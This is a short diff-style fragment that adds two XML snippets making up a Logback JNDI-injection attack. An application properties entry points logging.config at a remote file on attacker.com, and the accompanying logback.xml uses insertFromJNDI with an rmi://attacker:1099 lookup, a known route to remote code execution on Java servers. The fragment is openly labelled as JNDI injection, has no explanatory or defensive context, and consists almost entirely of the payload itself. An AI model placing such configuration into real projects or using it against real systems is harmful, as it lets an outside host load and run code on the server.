@@ -1,0 +1,9 @@
+<!-- application.xml → sets logging.config -->
+<properties>
+  <entry key="logging.config">http://attacker.com/logback.xml</entry>
+</properties>
+
+<!-- logback.xml → JNDI injection -->
+<configuration>
+  <insertFromJNDI env-entry-name="rmi://attacker:1099/Object" as="appName" />
+</configuration>
